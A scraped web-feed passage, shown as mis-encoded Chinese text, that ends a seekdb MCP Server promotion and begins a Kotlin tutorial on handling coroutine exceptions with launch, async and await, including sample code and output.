<table><thead><tr><th align="left"><strong>ä¼ ç»Ÿæ–¹å¼</strong></th><th align="left"><strong>MCP æ–¹å¼</strong></th></tr></thead><tbody><tr><td align="left">å­¦ä¹  SQL è¯­æ³•</td><td align="left">ç”¨è‡ªç„¶è¯­è¨€æè¿°éœ€æ±‚</td></tr><tr><td align="left">ç¼–å†™ä»£ç è°ƒç”¨ API</td><td align="left">AI è‡ªåŠ¨æ‰§è¡Œæ“ä½œ</td></tr><tr><td align="left">æ‰‹åŠ¨ç®¡ç†å‘é‡åµŒå…¥</td><td align="left">è‡ªåŠ¨ç”Ÿæˆå’Œç´¢å¼•</td></tr><tr><td align="left">åˆ†åˆ«å¤„ç†æœç´¢é€»è¾‘</td><td align="left">ä¸€å¥è¯æ··åˆæœç´¢</td></tr></tbody></table>
<p>æ— è®ºä½ æ˜¯æƒ³å¿«é€Ÿæ„å»º RAG åº”ç”¨ï¼Œè¿˜æ˜¯æƒ³è®© AI åŠ©æ‰‹æ‹¥æœ‰"é•¿æœŸè®°å¿†"ï¼Œseekdb MCP Server éƒ½æ˜¯ä½ çš„æœ€ä½³é€‰æ‹©ã€‚</p>
<p><strong>å¼€å§‹ä½ çš„ AI åŸç”Ÿæ•°æ®åº“ä¹‹æ—…å§ï¼</strong> ğŸš€</p>
<hr/>
<p><strong>å‚è€ƒèµ„æ–™</strong></p>
<p>[1] seekdb éƒ¨ç½²æ–‡æ¡£: <em><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.oceanbase.ai%2Fdocs%2Fdeploy-overview%2F" target="_blank" title="https://www.oceanbase.ai/docs/deploy-overview/" ref="nofollow noopener noreferrer">www.oceanbase.ai/docs/deployâ€¦</a></em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Kotlin åç¨‹å¼‚å¸¸çš„é»„é‡‘å‡†åˆ™]]></title>    <link>https://juejin.cn/post/7597326073671974927</link>    <guid>https://juejin.cn/post/7597326073671974927</guid>    <pubDate>2026-01-21T00:26:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597326073671974927" data-draft-id="7594657393830707238" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Kotlin åç¨‹å¼‚å¸¸çš„é»„é‡‘å‡†åˆ™"/> <meta itemprop="keywords" content="Kotlin,Android"/> <meta itemprop="datePublished" content="2026-01-21T00:26:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="RockByte"/> <meta itemprop="url" content="https://juejin.cn/user/1046390797768519"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Kotlin åç¨‹å¼‚å¸¸çš„é»„é‡‘å‡†åˆ™
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1046390797768519/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    RockByte
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T00:26:05.000Z" title="Wed Jan 21 2026 00:26:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{position:relative;word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;color:#282d36}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:30px;margin-bottom:5px;color:#2f845e}.markdown-body h2{font-size:22px;display:inline-block;font-weight:700;background:#2f845e;color:#fff;padding:6px 8px 0 0;border-top-right-radius:6px;margin-right:2px;box-shadow:6px 3px 0 0 rgba(47,132,194,.2)}.markdown-body h2:before{content:" ";display:inline-block;width:8px}.markdown-body h2:after{content:" ";position:absolute;display:block;width:calc(100% - 32px);border-bottom:3px solid #2f845e}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%;box-shadow:6px 6px 6px #888}.markdown-body hr{border:none;border-top:1px solid rgba(66,185,131,.15);margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#f6ffed;color:#52c41a;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:16px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#262626;border:1px solid #2f845e;border-top:8px solid #2f845e;background:linear-gradient(180deg,rgba(66,185,131,.1),transparent)!important}.markdown-body pre&gt;code.hljs[lang]:before{top:8px!important;color:#2f845e!important}.markdown-body pre&gt;code.language-awesome_error{border:1px solid #ff4d4f!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#ff4d4f!important;background:#fff2f0!important}.markdown-body pre&gt;code.language-awesome_error:before{content:"!"!important;position:absolute!important;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#ff4d4f!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body pre&gt;code.language-awesome_warn{border:1px solid #ffc46f!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#ffc46f!important;background:#fffbe6!important}.markdown-body pre&gt;code.language-awesome_warn:before{content:"â˜‚"!important;position:absolute;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#ffc46f!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body pre&gt;code.language-awesome_success{border:1px solid #52c41a!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#52c41a!important;background:#f6ffed!important}.markdown-body pre&gt;code.language-awesome_success:before{content:"âœ“"!important;position:absolute!important;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#52c41a!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body pre&gt;code.language-awesome_info{border:1px solid #1890ff!important;border-left-width:8px;font-size:14px;font-weight:700;padding:15px 12px 15px 16px;margin:0;word-break:normal;white-space:break-spaces;display:block;overflow-x:auto;color:#1890ff!important;background:#e6f7ff!important}.markdown-body pre&gt;code.language-awesome_info:before{content:"i"!important;position:absolute!important;top:50%!important;left:-9px!important;transform:translateY(-14px)!important;background:#1890ff!important;color:#fff!important;border:2px solid #fff!important;display:flex;align-items:center;justify-content:center;width:22px;height:22px;border-radius:100%;font-weight:700;font-family:Dosis,Source Sans Pro,Helvetica Neue,Arial,sans-serif;font-size:16px}.markdown-body strong{background-color:inherit;color:#2f845e}.markdown-body em{background-color:inherit;color:#949415}.markdown-body a{text-decoration:none;color:#2f8e54;border-bottom:1px solid #3f9e64}.markdown-body a:active,.markdown-body a:hover{color:#3f9e64}.markdown-body a[class^=footnote]{margin-left:4px}.markdown-body a:before{content:"â¤ "}.markdown-body table{font-size:12px;width:100%;max-width:100%;overflow:auto;border:2px solid #2f8e54}.markdown-body thead{background:#2f8e54;color:#fff;text-align:left;font-weight:700}.markdown-body tr:nth-child(2n){background-color:rgba(153,255,188,.1)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:22px}.markdown-body td{min-width:120px}.markdown-body blockquote{padding:1px 22px;margin:22px 0;border-left:6px solid #2f845e;background-color:rgba(66,185,131,.1);border-radius:2px}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#2f845e}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px;color:#282d36}.markdown-body del{color:#2f845e}.markdown-body input[type=checkbox]:checked:before{content:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAA/klEQVQ4T72TMU7DQBBF318XdFR06egQEnAXRINEGlqgowoIR8AF4AZOZ4JEGq5AC5EixBU4A55BNrEVHAcSBTHlaubt37/zxZKlcn7n6mDPXJvz8IJ89HzWu8t7C8D2dfsY52ae4apHnLx0ktsCsHXZjiUuFgG40x2eJ/H/AhztB+zDUTpLwWj8jGkzxSHiHaMPrDQC8sMoilKzLAUqiKQjmb+ZuAdW80tmelCHODoNgSfP7AFprTTaRTzsJN1GEyuIZ7uW6TEEHwCtyV/6EVBKJHhfzgC0Xv/iXwEFBF4FG0378bd7sPQq5xK/hSnk6sdlX3mZrKkwLZKBeu8n9XuWEUE7X+YAAAAASUVORK5CYII=);position:relative;top:-1px;left:-1px}.markdown-body .math .katex{font-family:Menlo,Monaco,Consolas,Courier New,monospace;word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#f6ffed;color:#52c41a;font-size:.87em;padding:.065em .4em}@media (max-width:720px){.markdown-body h1{font-size:22px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="xcode">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff;color:#000}.xml .hljs-meta{color:silver}.hljs-comment,.hljs-quote{color:#007400}.hljs-attribute,.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-tag{color:#aa0d91}.hljs-template-variable,.hljs-variable{color:#3f6e74}.hljs-code,.hljs-meta-string,.hljs-string{color:#c41a16}.hljs-link,.hljs-regexp{color:#0e0eff}.hljs-bullet,.hljs-number,.hljs-symbol,.hljs-title{color:#1c00cf}.hljs-meta,.hljs-section{color:#643820}.hljs-built_in,.hljs-builtin-name,.hljs-class .hljs-title,.hljs-params,.hljs-type{color:#5c2699}.hljs-attr{color:#836c28}.hljs-subst{color:#000}.hljs-formula{background-color:#eee;font-style:italic}.hljs-addition{background-color:#baeeba}.hljs-deletion{background-color:#ffc8bd}.hljs-selector-class,.hljs-selector-id{color:#9b703f}.hljs-doctag,.hljs-strong{font-weight:700}.hljs-emphasis{font-style:italic}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e0ca5b7edf22418d94601a1398bba020~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUm9ja0J5dGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769559965&amp;x-signature=LziwAwIiP2DImyzd71500K28jNs%3D" alt="0.jpg" loading="lazy"/></p>
<p>ä¹‹å‰æˆ‘å†™è¿‡ä¸€ç¯‡æ–‡ç«  <a href="https://juejin.cn/post/7497895954102468648" target="_blank" title="https://juejin.cn/post/7497895954102468648">Kotlinåç¨‹å¼‚å¸¸ä¸€æ–‡é€š</a>ï¼Œé‚£ç¯‡æ–‡ç« ç›´æ¥ä»å¼‚å¸¸çš„å‡½æ•°å…¥æ‰‹ï¼Œè®²è¿°äº† Kotlin åç¨‹çš„ç‰¹ç‚¹å’Œéƒ¨åˆ†ç”¨æ³•ã€‚</p>
<p>æˆ‘æŠŠé‚£ç¯‡æ–‡ç« åˆ†äº«ç»™äº†åŒäº‹ï¼Œè¿‡äº†ä¸€æ®µæ—¶é—´ï¼Œä»–è¿˜æ˜¯æ¥é—®æˆ‘ï¼š<code>coroutineScope</code> å¤„ç†å¼‚å¸¸æœ‰ä»€ä¹ˆç‰¹ç‚¹ï¼Ÿ</p>
<p>è™½ç„¶é‚£ç¯‡æ–‡ç« æˆ‘è®¤ä¸ºå†™çš„éå¸¸æ˜ç¡®ï¼Œä½†æ˜¯æˆ‘æƒ³ä»–æ—¢ç„¶è®°ä¸ä½ï¼Œå¯èƒ½å¤ªæ•™ç§‘ä¹¦äº†ã€‚æˆ‘å‘Šè¯‰ä»–ï¼Œä½ ç­‰æˆ‘ä¸‹ç¯‡æ–‡ç« ï¼Œæˆ‘ç»™ä½ è®²ä¸ªæ˜æ˜ç™½ç™½ã€‚</p>
<p>äºæ˜¯ï¼Œæˆ‘æ‰“ç®—ä»æ¡ˆä¾‹å…¥æ‰‹ï¼Œæ¥å‡ æ¡é»„é‡‘å‡†åˆ™ï¼Œä¸€ç¯‡æ–‡ç« ææ‡‚åœ¨ Kotlin åç¨‹ä¸­å¦‚ä½•å¤„ç†å¼‚å¸¸ã€‚</p>
<p>åç¨‹å¼‚å¸¸å¤„ç†çš„æ ¸å¿ƒæœºåˆ¶æ˜¯<strong>ç»“æ„åŒ–å¹¶å‘</strong>ã€‚</p>
<p>è¿™æ˜¯ Kotlin åç¨‹çš„è®¾è®¡åŸåˆ™ï¼Œä¹Ÿæ˜¯ä¸ºä»€ä¹ˆåç¨‹å¼‚å¸¸æœ‰ç‚¹éš¾å¤„ç†çš„åŸå› ã€‚</p>
<p>ä½ å¯ä»¥æŠŠå®ƒæƒ³è±¡æˆä¸€æ£µä»»åŠ¡æ ‘ï¼šåªè¦æŸä¸ªå­åç¨‹å› å¼‚å¸¸å¤±è´¥ï¼Œå°±ä¼šç«‹å³é€šçŸ¥çˆ¶åç¨‹ï¼›çˆ¶åç¨‹ä¼šé©¬ä¸Šå–æ¶ˆæ‰€æœ‰å…¶ä»–å­åç¨‹ï¼Œéšåè‡ªèº«ä¹Ÿè¢«å–æ¶ˆï¼Œå¹¶å°†å¼‚å¸¸ç»§ç»­å‘ä¸Šä¼ æ’­ã€‚</p>
<p>è¿™ç§æœºåˆ¶èƒ½ç¡®ä¿ä¸ä¼šæœ‰ä»»ä½•â€œå­¤å„¿åç¨‹â€è¢«é—æ¼ï¼Œè®©åç¨‹çš„ç”Ÿå‘½å‘¨æœŸå§‹ç»ˆå¤„äºå¯æ§çŠ¶æ€ã€‚</p>
<p>ä¸‹é¢æˆ‘ä»¬ç»“åˆå®é™…å¼€å‘åœºæ™¯ï¼Œæ‹†è§£åç¨‹å¼‚å¸¸å¤„ç†çš„æ ¸å¿ƒé€»è¾‘å’Œæ­£ç¡®å§¿åŠ¿ã€‚</p>
<h2 data-id="heading-0">åœºæ™¯ä¸€ï¼šä½¿ç”¨ launch</h2>
<p><code>launch</code> æ˜¯å…¸å‹çš„ â€œfire-and-forgetï¼ˆå‘èµ·å³å¿˜ï¼‰â€å‹åç¨‹æ„å»ºå™¨ï¼Œé€‚åˆä¸éœ€è¦è¿”å›ç»“æœçš„ä»»åŠ¡ã€‚ä½†å®ƒçš„å¼‚å¸¸å¤„ç†é€»è¾‘å¾ˆå®¹æ˜“è¸©å‘ï¼Œæ–°æ‰‹å¸¸åœ¨è¿™é‡Œæ ½è·Ÿå¤´ã€‚</p>
<h3 data-id="heading-1">é”™è¯¯åšæ³•ï¼šåœ¨ launch å¤–å±‚å¥— try-catch</h3>
<p>è¿™æ˜¯é«˜é¢‘é”™è¯¯ç”¨æ³•ï¼šæŠŠ <code>launch</code> è°ƒç”¨åŒ…è£¹åœ¨ <code>try-catch</code> é‡Œï¼Œè¿™æ ·åš<strong>æ ¹æœ¬æ— æ³•æ•è·åç¨‹å†…éƒ¨æŠ›å‡ºçš„å¼‚å¸¸</strong>ã€‚</p>
<h3 data-id="heading-2">é—®é¢˜åŸå› </h3>
<p><code>launch</code> ä¼šç«‹å³è¿”å›ï¼Œè€Œåç¨‹ä½“é‡Œçš„ä»£ç æ˜¯åœ¨åå°çº¿ç¨‹å¼‚æ­¥æ‰§è¡Œçš„ã€‚ç­‰å¼‚å¸¸çœŸæ­£æŠ›å‡ºæ—¶ï¼Œå¤–å±‚çš„ <code>try-catch</code> æ—©å°±æ‰§è¡Œå®Œäº†ã€‚æœ€ç»ˆå¼‚å¸¸ä¼šä¸€è·¯å†’æ³¡åˆ°é¡¶å±‚å¼‚å¸¸å¤„ç†å™¨ï¼Œè‹¥æ— äººå¤„ç†ï¼Œåº”ç”¨å°±ä¼šç›´æ¥å´©æºƒã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    println(<span class="hljs-string">"Before launch"</span>)
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// è¿™ä¸ª launch å—ä¼šæŠ›å‡ºå¼‚å¸¸</span>
        launch {
            println(<span class="hljs-string">"Inside launch: Throwing exception..."</span>)
            delay(<span class="hljs-number">500</span>) <span class="hljs-comment">// æ¨¡æ‹Ÿè€—æ—¶æ“ä½œ</span>
            <span class="hljs-keyword">throw</span> RuntimeException(<span class="hljs-string">"Something went wrong!"</span>)
        }
    } <span class="hljs-keyword">catch</span> (e: Exception) {
        <span class="hljs-comment">// âŒ è¿™æ®µä»£ç æ°¸è¿œä¸ä¼šæ‰§è¡Œ âŒ</span>
        println(<span class="hljs-string">"Caught exception: <span class="hljs-variable">$e</span>"</span>)
    }
    println(<span class="hljs-string">"After launch"</span>)
    delay(<span class="hljs-number">1000</span>) <span class="hljs-comment">// ä¿æŒä¸»çº¿ç¨‹å­˜æ´»ï¼Œè§‚å¯Ÿå´©æºƒç°è±¡</span>
    println(<span class="hljs-string">"Main finished"</span>)
}
</code></pre>
<pre><code class="hljs language-php" lang="php">Before launch
After launch
Inside launch: Throwing exception...
<span class="hljs-built_in">Exception</span> in thread <span class="hljs-string">"main"</span> java.lang.<span class="hljs-built_in">RuntimeException</span>: Something went wrong!
...
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œâ€œCaught exceptionâ€ ä»æœªæ‰“å°ï¼Œç¨‹åºç›´æ¥å´©æºƒã€‚</p>
<h3 data-id="heading-3">æ­£ç¡®åšæ³•ï¼šåœ¨ launch å†…éƒ¨ä½¿ç”¨ try-catch</h3>
<p>è¦å¤„ç†æŸä¸ª <code>launch</code> åç¨‹çš„å¼‚å¸¸ï¼Œå¿…é¡»æŠŠ <code>try-catch</code> ç›´æ¥æ”¾åœ¨åç¨‹çš„ <strong>lambda</strong> è¡¨è¾¾å¼å†…éƒ¨ã€‚</p>
<p><em>è¿™ä¸ªåšæ³•ç®€ç›´æ˜¯å¼‚å¸¸å¤„ç†çš„å¤æ³•æ•è·ï¼</em></p>
<p>è¿™æ ·èƒ½è®©å¼‚å¸¸å¤„ç†é€»è¾‘ç´§è·Ÿå¼‚å¸¸å‘ç”Ÿçš„ä½ç½®â€”â€”ä¹Ÿå°±æ˜¯åç¨‹è‡ªèº«çš„æ‰§è¡Œè·¯å¾„ä¸Šã€‚åªæœ‰è¿™æ ·ï¼Œæ‰èƒ½ä¼˜é›…å¤„ç†é”™è¯¯ï¼Œé¿å…æ•´ä¸ªä½œç”¨åŸŸå´©æºƒã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    println(<span class="hljs-string">"Before launch"</span>)
    launch {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// é£é™©ä»£ç æ”¾åœ¨ try å—ä¸­</span>
            println(<span class="hljs-string">"Inside launch: Doing some work..."</span>)
            delay(<span class="hljs-number">500</span>)
            <span class="hljs-keyword">throw</span> RuntimeException(<span class="hljs-string">"Oops, failed!"</span>)
        } <span class="hljs-keyword">catch</span> (e: Exception) {
            <span class="hljs-comment">// âœ… æ­£ç¡®æ•è·å¼‚å¸¸</span>
            println(<span class="hljs-string">"Caught exception inside launch: <span class="hljs-subst">${e.message}</span>"</span>)
        }
    }
    println(<span class="hljs-string">"After launch"</span>)
    delay(<span class="hljs-number">1000</span>) <span class="hljs-comment">// ç­‰å¾… launch æ‰§è¡Œå®Œæˆ</span>
    println(<span class="hljs-string">"Main finished"</span>)
}
</code></pre>
<pre><code class="hljs language-Plain" lang="Plain">
Before launch
After launch
Inside launch: Doing some work...
Caught exception inside launch: Oops, failed!
Main finished
</code></pre>
<p>æ­¤æ—¶ç¨‹åºèƒ½æ­£å¸¸å¤„ç†å¼‚å¸¸ï¼Œä¸ä¼šå´©æºƒã€‚</p>
<h2 data-id="heading-4">åœºæ™¯äºŒï¼šä½¿ç”¨ async æ„å»ºå™¨</h2>
<p>å½“éœ€è¦æ‰§è¡Œä»»åŠ¡å¹¶åç»­è·å–ç»“æœæ—¶ï¼Œç”¨ <code>async</code> æ„å»ºå™¨ï¼Œå®ƒä¼šè¿”å›ä¸€ä¸ª <code>Deferred</code> å¯¹è±¡ã€‚<code>async</code> çš„å¼‚å¸¸å¤„ç†é€»è¾‘å’Œ <code>launch</code> ä¸åŒâ€”â€”å®ƒä¼šâ€œæš‚å­˜â€å¼‚å¸¸ï¼Œç›´åˆ°ä½ è°ƒç”¨ <code>await()</code> è·å–ç»“æœæ—¶æ‰ä¼šæŠ›å‡ºã€‚</p>
<h3 data-id="heading-5">é”™è¯¯åšæ³•ï¼šåœ¨ async è°ƒç”¨å‘¨å›´å¥— try-catch</h3>
<p>ä»…æŠŠ <code>async</code> æœ¬èº«åŒ…è£¹åœ¨ <code>try-catch</code> é‡Œæ˜¯æ— æ•ˆçš„ã€‚</p>
<h3 data-id="heading-6">é—®é¢˜åŸå› </h3>
<p><code>async</code> ä¼šç«‹å³è¿”å› <code>Deferred</code> å¯¹è±¡ï¼Œåç¨‹å†…éƒ¨çš„å¼‚å¸¸ä¼šè¢«å­˜å‚¨åœ¨è¿™ä¸ªå¯¹è±¡ä¸­ï¼Œç­‰å¾…ä½ æ˜¾å¼è°ƒç”¨ <code>await()</code> æ—¶æ‰ä¼šæš´éœ²ã€‚å› æ­¤ï¼Œåœ¨ <code>async</code> å¤–å±‚ <code>try-catch</code> æ ¹æœ¬æ•è·ä¸åˆ°è¿™ä¸ªå»¶è¿Ÿå‡ºç°çš„å¼‚å¸¸ã€‚</p>
<h3 data-id="heading-7">æ­£ç¡®åšæ³•ï¼šåœ¨ await() è°ƒç”¨å‘¨å›´ç”¨ try-catch</h3>
<p>åªæœ‰è°ƒç”¨ <code>await()</code> è·å–ç»“æœæ—¶ï¼Œ<code>async</code> å†…éƒ¨çš„å¼‚å¸¸æ‰ä¼šè¢«é‡æ–°æŠ›å‡ºâ€”â€”è¿™æ˜¯å¼‚å¸¸çœŸæ­£â€œæ˜¾ç°â€çš„æ—¶åˆ»ã€‚</p>
<p>è¿™ç§è®¾è®¡è®©ä½ å¯ä»¥è‡ªä¸»å†³å®šå¤„ç†å¤±è´¥çš„æ—¶æœºå’Œæ–¹å¼ã€‚å¼‚å¸¸æ˜¯â€œå»¶è¿Ÿç»“æœâ€çš„ä¸€éƒ¨åˆ†ï¼Œåªæœ‰ä¸»åŠ¨è¯·æ±‚ç»“æœæ—¶æ‰ä¼šè§¦å‘å¼‚å¸¸ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-keyword">import</span> kotlinx.coroutines.*

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> = runBlocking {
    println(<span class="hljs-string">"Before async"</span>)
    <span class="hljs-keyword">val</span> deferredResult: Deferred&lt;String&gt; = async {
        println(<span class="hljs-string">"Inside async: About to fail..."</span>)
        delay(<span class="hljs-number">500</span>)
        <span class="hljs-keyword">throw</span> IllegalStateException(<span class="hljs-string">"Async operation failed!"</span>)
        <span class="hljs-string">"This will never be returned"</span>
    }
    println(<span class="hljs-string">"After async"</span>)
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// å¼‚å¸¸åœ¨è°ƒç”¨ await() æ—¶æŠ›å‡º</span>
        <span class="hljs-keyword">val</span> result = deferredResult.await()
        println(<span class="hljs-string">"Result: <span class="hljs-variable">$result</span>"</span>)
    } <span class="hljs-keyword">catch</span> (e: Exception) {
        <span class="hljs-comment">// âœ… æ­£ç¡®æ•è·å¼‚å¸¸</span>
        println(<span class="hljs-string">"Caught exception on await: <span class="hljs-subst">${e.message}</span>"</span>)
    }
    println(<span class="hljs-string">"Main finished"</span>)
}
</code></pre>
<pre><code class="hljs language-vbnet" lang="vbnet">
Before <span class="hljs-keyword">async</span>
After <span class="hljs-keyword">async</span>
Inside <span class="hljs-keyword">async</span>: About <span class="hljs-keyword">to</span> fail...
Caught exception <span class="hljs-keyword">on</span> <span class="hljs-built_in">await</span>: <span class="hljs-keyword">Async</span> operation failed!
Main finished
Exception <span class="hljs-keyword">in</span> thread <span class="hljs-string">"main"</span> java.lang.IllegalStateException: <span class="hljs-keyword">Async</span> operation failed!
... (å †æ ˆä¿¡æ¯) ...
</code></pre>
<p>æ³¨æ„ï¼šè™½ç„¶ <code>catch</code> å—æˆåŠŸæ•è·äº†å¼‚å¸¸ï¼Œä½†ç”±äºé¡¶å±‚å¼‚å¸¸æœªå¤„ç†ï¼Œç¨‹åºä»ä¼šå´©æºƒã€‚</p>
<p>è¿™é‡Œæ­£å¥½ä½“ç°äº†åç¨‹å¼‚å¸¸å‘ä¸Šä¼ æ’­çš„ç‰¹æ€§ã€‚</p>
<p>è‹¥è¦å®Œå…¨é¿å…å´©æºƒï¼Œéœ€åœ¨é¡¶å±‚æ·»åŠ å¼‚å¸¸å¤„ç†é€»è¾‘ï¼Œæˆ–ä½¿ç”¨ <code>CoroutineScope</code> çš„å¼‚å¸¸å¤„ç†å™¨ã€‚</p>
<p>æˆ–è€…ï¼Œä½ ç»§ç»­å¾€ä¸‹çœ‹ï¼</p>
<h3 data-id="heading-8">æ›¿ä»£æ–¹æ¡ˆï¼šåœ¨ async å†…éƒ¨ä½¿ç”¨ try-catch</h3>
<p>åœ¨ <code>async</code> å†…éƒ¨å¤„ç†å¼‚å¸¸ï¼Œèƒ½å®ç°é”™è¯¯æœ¬åœ°åŒ–ï¼Œå¹¶å¯æ ¹æ®å¤„ç†é€»è¾‘ä» <code>catch</code> å—è¿”å›ç»“æœã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œ<code>Deferred</code> å¯¹è±¡è¿”å›åä¸ä¼šå†æŠ›å‡ºå¼‚å¸¸â€”â€”å› ä¸ºå¼‚å¸¸å·²ç»æå‰å¤„ç†å®Œæ¯•ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin">
